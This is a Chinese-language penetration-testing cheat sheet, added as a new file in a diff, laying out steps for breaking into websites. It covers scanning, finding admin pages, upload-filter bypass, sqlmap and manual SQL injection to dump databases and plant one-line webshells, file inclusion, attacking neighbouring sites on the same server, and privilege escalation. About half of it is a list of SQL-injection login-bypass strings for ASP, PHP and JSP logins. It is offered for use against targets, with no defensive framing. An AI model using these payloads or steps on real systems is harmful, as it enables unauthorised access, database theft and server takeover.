@@ -1,0 +1,105 @@
+渗透思路
+1.扫描
+	1>系统端口扫描(nmap -v -A ip)
+  	2>全站扫描
+    	工具:awvs,appscan,hpinspect
+    	目的:通过等扫描目标站各种可能存在的漏洞，sql，xss，php执行，弱口令，  后台等各种脆弱的地方
+  	3>目录扫描
+    	工具:wwwscan,dirb,perk,御剑
+    	目的:扫描目标网站目录，可能会扫出后台，网站备份，fck目录，上传页面等
+    4>搜索引擎扫描
+    	工具:google,shadon,zoomeye（钟魁之眼）
+    	目的:通过google hacking等找出目标站点敏感路径,phpinfo,admin/login后台，数据库下载等
+2.万能密码和弱口令
+    工具:
+    	asp aspx万能密码
+        	1："or "a"="a
+        	2： ')or('a'='a
+        	3：or 1=1–
+        	4：'or 1=1– 
+        	5：a'or' 1=1–
+        	6："or 1=1–
+        	7：'or'a'='a
+        	8："or"="a'='a
+        	9：'or"='
+        	10：'or'='or'
+        	11: 1 or '1'='1'=1
+        	12: 1 or '1'='1' or 1=1
+        	13: 'OR 1=1%00
+        	14: "or 1=1%00
+        	15: 'xor
+        	16:新型万能登陆密码
+        	   	用户名 ' UNION Select 1,1,1 FROM admin Where "=' （替换表名admin）
+        	   	密码 1
+        	   	Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
+        	   	Password=1
+        	17:admin' or 'a'='a 密码随便
+    	PHP万能密码
+        	'or'='or'
+        	'or 1=1/* 字符型 GPC是否开都可以使用
+        	User: something
+        	Pass: ' OR '1'='1
+    	jsp万能密码
+        	1'or'1'='1
+        	admin' OR 1=1/*
+        	用户名：admin 系统存在这个用户的时候才用得上
+        	密码：1'or'1'='1
+      其他整理:
+        1) ' or''='
+        2) ' or 1=1--
+        3) ' or 'a'='a--
+        4) 'or'='or'
+        5) " or 1=1-- 
+        6）or 1=1--
+        7） or 'a='a
+        8）" or "a"="a 
+        9） ') or ('a'='a
+        10） ") or ("a"="a
+        11） ） or (1=1
+        12) 'or''='
+        13) 人气%' and 1=1 and '%'='
+   	目的:
+   		1>通过第一步扫描若扫出网站后台（一般端口80,8080等），用万能密码或弱口令尝试登录
+  		2>通过第一步扫描若扫出系统某个异常（非80,8080等）端口开放了http服务，且只是登录作用，用万能密码或弱口令尝试。
+3.上传
+  	工具:burpsuite,firebug
+  	目的:通过扫描找到了上传页面后，利用burp的各种绕过方法，和firebug的经典修改html方法等绕过上传限制。
+4.sql注入
+  	1>sqlmap
+  		1:脫裤进后台进后台再上传一句话
+  		2:根据注入点在有权限情况下写入一句话到物理路径
+  	2>手注
+  		1:order by+union sqli经典手注
+  		2:error-based blind sqli经典手注
+  		3:boolean-based biind sqli手注
+  		4:time-based blind sqli手注
+5.包含
+  	1>本地包含
+  	2>远程包含
+6.最新漏洞利用（利用最近爆出的漏洞渗透目标）
+  	1>exploit-db中有最全的exp可供参考
+  	2>sebug中有各种exp，但是不开源，需要提交poc，但是里面exp往往比exploit-db中的exp更新快
+  	3>beebeeto,类似sebug
+7.旁站和C段（目标站没希望时，旁站往往有希望）
+  	1>工具"同服旁注查询工具"里面的reverse ip比较好用，能找到比较多而准确的旁站信息。
+  	2>通过旁站跨裤，跨目录，多个旁站综合利用，eg.一个旁站的漏洞找出目标服务器物理路径，一个旁站的漏
+  	  洞有写文件权限，两者结合就可写一句话了。
+    
+8.社工
+9.提权（由小权限逐步扩大权限）
+  	1> 系统提权，exploit-db中的各种提权exp
+  	2> 第三方应用提权，pcanywhere，seru等
+
+
+
+
+
+其他思路：
+1.找后台：
+    1>递归目录字典扫描，工具dirbuster
+    2>普通大字典不递归目录扫描，工具wwwscan等
+    3>google hacking>site:xxx  inurl:admin | login | manage | sign | administrator 等，但是google hacking并不是万能的，搜不出来的时候参考4
+    4>有一次没找到后台，后来再用了一次netsparker扫描了一边，看到了有个admin目录，下面有个main.   
+      php页面，访问一下，发现是后台，netsparker用awvs或其他工具应该也可以。
+    5>访问robots.txt  
+    6>猜想：在google关键字没找到的时候，用yahoo，bing等工具尝试
